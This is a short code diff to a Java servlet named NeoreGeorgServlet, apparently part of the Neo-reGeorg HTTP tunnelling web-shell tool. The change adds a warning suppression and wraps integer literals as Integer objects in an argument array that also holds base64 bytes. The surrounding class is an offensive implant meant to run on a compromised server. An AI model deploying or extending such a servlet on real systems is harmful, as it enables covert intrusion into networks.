@@ -38,6 +38,7 @@ public class NeoreGeorgServlet extends ClassLoader implements Servlet {
     }
 
     @Override
+    @SuppressWarnings("all")
     public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
         HttpServletRequest request = (HttpServletRequest) servletRequest;
         HttpServletResponse response = (HttpServletResponse) servletResponse;
@@ -48,14 +49,14 @@ public class NeoreGeorgServlet extends ClassLoader implements Servlet {
                         response,
                         chars.toCharArray(),
                         base64Bytes,
-                        200,
-                        513,
-                        524288,
+                        new Integer(200),
+                        new Integer(513),
+                        new Integer(524288),
                         hello,
-                        1447564139,
-                        0,
-                        0,
-                        0,
+                        new Integer(1447564139),
+                        new Integer(0),
+                        new Integer(0),
+                        new Integer(0),
                 };
 
                 if (namespace.get(chars) == null) {
